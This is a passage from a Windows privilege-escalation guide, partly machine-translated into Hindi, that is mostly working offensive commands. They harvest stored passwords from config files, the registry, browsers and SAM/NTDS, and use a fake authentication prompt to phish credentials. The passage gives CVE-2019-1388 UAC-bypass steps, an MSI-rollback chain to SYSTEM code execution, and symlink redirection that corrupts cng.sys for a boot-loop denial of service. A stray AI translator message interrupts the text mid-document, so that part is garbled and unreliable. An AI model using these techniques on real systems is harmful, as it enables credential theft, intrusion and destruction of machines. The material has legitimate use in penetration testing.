gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके credentials दर्ज करने के लिए कह सकते हैं या यहां तक कि किसी दूसरे उपयोगकर्ता के credentials भी माँग सकते हैं** यदि आपको लगता है कि वह उन्हें जानता होगा (ध्यान दें कि क्लाइंट से सीधे **पूछना** और **credentials** माँगना वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइलनाम जिनमें credentials शामिल हो सकते हैं**

ज्ञात फ़ाइलें जो कुछ समय पहले **passwords** को **clear-text** या **Base64** में रखती थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md here (or give a copy of the proposed files). Once you provide the text, I'll translate the relevant English to Hindi and return the file with the exact same markdown/html syntax.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

आपको Bin में भी credentials के लिए जाँच करनी चाहिए

कई प्रोग्रामों द्वारा सहेजे गए पासवर्ड **पुनर्प्राप्त करने** के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**credentials के साथ अन्य संभावित रजिस्ट्री keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जांच करनी चाहिए जहाँ **Chrome or Firefox** के passwords संग्रहीत होते हैं.\
ब्राउज़रों के history, bookmarks और favourites की भी जांच करें क्योंकि संभवतः कुछ **passwords** वहाँ संग्रहीत हों।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के भीतर निर्मित एक तकनीक है जो अलग‑अलग भाषाओं के software components के बीच इंटरकम्यूनिकेशन की अनुमति देती है। प्रत्येक COM component को **class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality एक्सपोज़ करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces रजिस्ट्री में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह रजिस्ट्री **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मर्ज करके बनाई जाती है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी रूप से, यदि आप उन किसी भी DLLs को overwrite कर सकें जिन्हें execute किया जाएगा, तो आप escalate privileges कर सकते हैं अगर वह DLL किसी अलग user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**फाइलों की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशिष्ट फ़ाइल नाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin। मैंने यह प्लगइन बनाया है ताकि यह **automatically execute every metasploit POST module that searches for credentials** inside the victim.\  
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पृष्ठ में उल्लिखित पासवर्ड वाले सभी फाइलों की खोज करता है.\  
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से पासवर्ड निकालने के लिए एक और बढ़िया टूल है।

यह टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process के बीच communication और data transfer सक्षम करते हैं।

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. यह client/server आर्किटेक्चर जैसा होता है, जिसमें रोल्स को **named pipe server** और **named pipe client** के रूप में परिभाषित किया जाता है।

जब कोई **client** pipe के ज़रिये data भेजता है, तो वह **server** जिसने pipe सेट किया है, आवश्यक **SeImpersonate** rights होने पर **client की identity लेने** में सक्षम होता है। अगर आप किसी ऐसे **privileged process** की पहचान कर लें जो आपके द्वारा mimic किए जा सकने वाले pipe के माध्यम से communicate करता है, तो जब वह उस pipe के साथ interact करेगा आप उसकी identity अपनाकर **उच्च privileges हासिल** कर सकते हैं। इस तरह के attack को कैसे execute किया जाए इसके निर्देशों के लिए उपयोगी मार्गदर्शक [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) दिए गए हैं।

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). एक remote authenticated client mailslot-based async event path का दुरुपयोग करके `ClientAttach` को किसी भी मौजूदा फाइल पर arbitrary **4-byte write** में बदल सकता है जो `NETWORK SERVICE` द्वारा लिखी जा सकती है, फिर Telephony admin rights हासिल करके arbitrary DLL को service के रूप में load कर सकता है। पूरा फ्लो:

- `ClientAttach` में `pszDomainUser` को किसी writable existing path पर सेट करें → service उसे `CreateFileW(..., OPEN_EXISTING)` के माध्यम से खोलता है और async event writes के लिए उपयोग करता है।
- हर event attacker-controlled `InitContext` को जो `Initialize` में है उस handle पर लिखता है। एक line app को `LRegisterRequestRecipient` (`Req_Func 61`) के साथ register करें, `TRequestMakeCall` (`Req_Func 121`) ट्रिगर करें, `GetAsyncEvents` (`Req_Func 0`) के जरिए fetch करें, फिर unregister/shutdown कर के deterministic writes को repeat करें।
- खुद को `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` में जोड़ें, reconnect करें, फिर arbitrary DLL path के साथ `GetUIDllName` कॉल करें ताकि `TSPI_providerUIIdentify` को `NETWORK SERVICE` के रूप में execute किया जा सके।

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) ट्रिगर कर सकते हैं और attacker-controlled files को current user के रूप में execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **कमांड लाइनों में पासवर्ड्स की निगरानी**

When getting a shell as a user, वहां scheduled tasks या अन्य processes चल रहे हो सकते हैं जो **command line पर credentials पास करते हैं**। नीचे दिया गया script हर दो सेकंड में process command lines को कैप्चर करता है और current state की तुलना previous state से करके किसी भी बदलाव को output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console या RDP) तक पहुँच है और UAC सक्षम है, तो कुछ Microsoft Windows के संस्करणों में एक unprivileged user से terminal या कोई अन्य process जैसे "NT\AUTHORITY SYSTEM" चलाना संभव है।

यह एक ही vulnerability के साथ privileges escalate करने और UAC को bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं होती और प्रोसेस के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued है।

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability का exploit करने के लिए, निम्नलिखित चरणों का पालन करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह हमला मूल रूप से Windows Installer के rollback फीचर का दुरुपयोग करके uninstallation प्रक्रिया के दौरान वैध फाइलों को दुर्भावनापूर्ण फाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनानी होगी जो `C:\Config.Msi` फोल्डर को hijack करने के लिए उपयोग की जाएगी, जिसे बाद में Windows Installer द्वारा अन्य MSI पैकेजों की uninstall के दौरान rollback फ़ाइलें स्टोर करने के लिए उपयोग किया जाएगा, जहां rollback फ़ाइलों में malicious payload डाली जाएगी।

संक्षेप में तकनीक इस प्रकार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- बूम: आपका कोड SYSTEM के रूप में चलाया जाता है।

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **इंडेक्स मेटाडेटा** संग्रहीत करता है।

तो, अगर आप फ़ोल्डर का **`::$INDEX_ALLOCATION` stream डिलीट करते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरे फ़ोल्डर को हटा देता है**।

आप यह standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद फ़ोल्डर को हटाता है**।

### फ़ोल्डर की सामग्री हटाने से SYSTEM EoP तक
यदि आपकी primitive आपको arbitrary files/folders को हटाने की अनुमति नहीं देती, लेकिन यह **attacker-controlled folder के *contents* को हटाने की अनुमति देती है** तो क्या होगा?

1. चरण 1: एक bait folder और file सेटअप करें
- बनाएँ: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. चरण 2: `file1.txt` पर एक **oplock** रखें
- यह **oplock** जब कोई विशेषाधिकार प्राप्त प्रक्रिया `file1.txt` को हटाने का प्रयास करती है तो **निष्पादन को रोक देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों को स्कैन करती है (उदा., `%TEMP%`) और उनकी सामग्री हटाने की कोशिश करती है।
- जब यह `file1.txt` पर पहुँचता है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- विकल्प A: `file1.txt` को कहीं और स्थानांतरित करें
- इससे `folder1` खाली हो जाएगा बिना oplock को तोड़े।
- `file1.txt` को सीधे डिलीट न करें — इससे oplock समय से पहले रिहा हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो फ़ोल्डर metadata को स्टोर करता है — इसे हटाने पर फ़ोल्डर भी हट जाता है।

5. Step 5: Release the oplock
- SYSTEM process जारी रहता है और `file1.txt` को हटाने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में निम्न को हटा रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` SYSTEM द्वारा हटाया जाता है।

### From Arbitrary Folder Create to Permanent DoS

ऐसे primitive का शोषण करें जो आपको **create an arbitrary folder as SYSTEM/admin** करने की अनुमति देता है — भले ही आप **you can’t write files** हों या **set weak permissions** नहीं कर सकें।

एक **folder** (not a file) बनाएँ जिसका नाम किसी **critical Windows driver** के समान हो, e.g.:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode driver को संदर्भित करता है।
- यदि आप इसे **पहले से फ़ोल्डर के रूप में बना देते हैं**, तो Windows बूट पर वास्तविक ड्राइवर को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर का पता लगाने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- ऐसी स्थिति में **कोई fallback नहीं होता**, और **बाहरी हस्तक्षेप के बिना कोई recovery नहीं** (उदा., बूट रिपेयर या डिस्क एक्सेस)।

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

जब कोई **privileged service** लॉग/एक्सपोर्ट को उस पथ पर लिखता है जो किसी **writable config** से पढ़ा जाता है, तो उस पथ को **Object Manager symlinks + NTFS mount points** के साथ redirect कर दें, ताकि privileged write को arbitrary overwrite में बदला जा सके (यहाँ तक कि **बिना** SeCreateSymbolicLinkPrivilege)।

**Requirements**
- लक्ष्य path संग्रहीत करने वाला config हमलावर द्वारा writable होना चाहिए (उदा., `%ProgramData%\...\.ini`)।
- `\RPC Control` पर एक mount point और एक OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- एक privileged ऑपरेशन जो उस पथ पर लिखता हो (log, export, report)।

**Example chain**
1. Config पढ़कर privileged log destination पुनः प्राप्त करें, उदाहरण के लिए `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` जो `C:\ProgramData\ICONICS\IcoSetup64.ini` में है।
2. बिना admin के पथ को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. विशेषाधिकार प्राप्त component से लॉग लिखने का इंतज़ार करें (उदा., admin "send test SMS" ट्रिगर करता है)। यह write अब `C:\Windows\System32\cng.sys` में होता है।
4. ओवरराइट हुए लक्ष्य (hex/PE parser) का निरीक्षण करें ताकि करप्शन की पुष्टि हो सके; reboot करने पर Windows बदली हुई driver path लोड करने के लिए मजबूर होता है → **boot loop DoS**। यह किसी भी protected फ़ाइल पर सामान्यीकृत होता है जिसे कोई विशेषाधिकार प्राप्त service write के लिए खोलेगा।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन अगर `C:\Windows\System32\cng.sys` में एक copy मौजूद है तो उसे पहले कोशिश किया जा सकता है, जिससे यह corrupt data के लिए एक विश्वसनीय DoS sink बन जाता है।



## **High Integrity से System तक**

### **नई सर्विस**

यदि आप पहले से ही High Integrity process पर चल रहे हैं, तो **SYSTEM तक का रास्ता** सिर्फ **एक नई सर्विस बनाकर और उसे execute करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक valid service है या binary आवश्यक क्रियाएँ तेजी से करता हो, क्योंकि अगर यह valid service नहीं होगा तो इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (संभवत: आप इन्हें पहले से ही High Integrity प्रक्रिया में पाएंगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes नहीं) को **open almost any process** कर पाएँगे, उस process का **copy the token** कर सकेंगे, और उस token के साथ कोई भी **arbitrary process with that token** create कर सकेंगे।\
इस technique का उपयोग आमतौर पर SYSTEM के रूप में चल रहे किसी ऐसे process को select करने के लिए किया जाता है जिसमें सभी token privileges हों (_हाँ, आप SYSTEM processes पा सकते हैं जिनमें सभी token privileges नहीं होते_)।\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

अगर आप किसी **dll को hijack** कर लें जो कि **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **loaded** हो रहा हो, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए भी उपयोगी है, और इसके अलावा इसे High Integrity प्रक्रिया से हासिल करना काफी ज्यादा आसान है क्योंकि उसके पास उन folders पर **write permissions** होंगे जिनका उपयोग dlls को load करने के लिए होता है।\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
